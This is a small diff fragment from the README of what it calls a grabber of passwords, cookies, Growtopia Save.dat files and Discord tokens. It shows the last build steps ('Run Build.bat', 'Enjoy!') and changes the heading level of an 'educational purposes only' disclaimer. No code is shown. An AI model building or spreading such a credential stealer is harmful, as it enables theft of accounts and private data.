@@ -9,4 +9,4 @@ Grabber That Grabs Passwords, Cookies, Growtopia Save.dat, Discord Tokens And Ex
 5. Run Build.bat And Wait Until It Finishes.
 6. Enjoy!
 
-# THIS REPOSITORY IS FOR EDUCATIONAL PURPOSES ONLY!
+## THIS REPOSITORY IS FOR EDUCATIONAL PURPOSES ONLY!
